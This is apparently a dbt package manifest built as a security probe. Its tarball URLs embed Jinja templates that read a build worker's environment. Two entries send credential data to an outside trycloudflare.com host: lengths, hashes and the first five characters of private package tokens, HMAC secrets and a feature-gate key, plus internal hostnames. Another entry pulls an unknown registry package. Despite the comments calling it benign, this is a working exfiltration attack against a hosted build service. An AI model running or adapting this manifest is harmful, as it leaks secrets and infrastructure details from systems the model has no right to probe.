# Benign security-research probe, run 2. nonce 02b7325f0935
packages:
  # h0 BENIGN CONTROL -- no Jinja.
  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/h0-control?n=02b7325f0935&rung=h0"
    name: l145d9_h0_control

  # h1 FULL-LENGTH TRAVERSAL PROOF -- filler of exactly len(credential),
  # beside local_md5 of the REAL value. The value itself never leaves.
  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/h1-traverse?n=02b7325f0935&rung=h1&PPAT_fill={{ 'A' * (env_var('DBT_CLOUD_PRIVATE_PACKAGES_AUTH_TOKEN','') | length) }}&PPAT_h={{ local_md5(env_var('DBT_CLOUD_PRIVATE_PACKAGES_AUTH_TOKEN',''))[0:16] if local_md5 is defined else 'nomd5' }}&SLSEC_fill={{ 'B' * (env_var('SL_HMAC_AUTH_SECRET','') | length) }}&SLSEC_h={{ local_md5(env_var('SL_HMAC_AUTH_SECRET',''))[0:16] if local_md5 is defined else 'nomd5' }}"
    name: l145d9_h1_traverse

  # h2 IDENTITY of every credential-shaped worker variable + PLAIN infrastructure values.
  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/h2-ident?n=02b7325f0935&rung=h2&{% set _PPAT = env_var('DBT_CLOUD_PRIVATE_PACKAGES_AUTH_TOKEN','') %}PPAT_p={{ _PPAT[0:5] }}&PPAT_l={{ _PPAT | length }}&PPAT_h={{ local_md5(_PPAT)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _SLSEC = env_var('SL_HMAC_AUTH_SECRET','') %}SLSEC_p={{ _SLSEC[0:5] }}&SLSEC_l={{ _SLSEC | length }}&SLSEC_h={{ local_md5(_SLSEC)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _SLTOK = env_var('SL_HMAC_AUTH_TOKEN','') %}SLTOK_p={{ _SLTOK[0:5] }}&SLTOK_l={{ _SLTOK | length }}&SLTOK_h={{ local_md5(_SLTOK)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _FGKEY = env_var('_DBT_FEATURE_GATE_KEY','') %}FGKEY_p={{ _FGKEY[0:5] }}&FGKEY_l={{ _FGKEY | length }}&FGKEY_h={{ local_md5(_FGKEY)[0:10] if local_md5 is defined else 'nomd5' }}&HUB={{ env_var('DBT_PACKAGE_HUB_URL','') }}&MFS={{ env_var('MFS_HOST','') }}&SLG={{ env_var('SLG_HOST','') }}&STATSD={{ env_var('DBT_ENV_PRIVATE_STATSD_HOST','') }}&ACCTHOST={{ env_var('DBT_CLOUD_ACCOUNT_HOST','') }}&DBTENV={{ env_var('DBT_ENV','') }}&INVENV={{ env_var('DBT_INVOCATION_ENV','') }}&ENVTYPE={{ env_var('DBT_CLOUD_ENVIRONMENT_TYPE','') }}&HOSTNAME={{ env_var('HOSTNAME','') }}"
    name: l145d9_h2_ident

  # h3 REGISTRY package -- resolves through DBT_PACKAGE_HUB_URL. LAST, because a
  # registry miss aborts resolution for everything after it.
  - package: cleave/probe
    version: 0.0.1
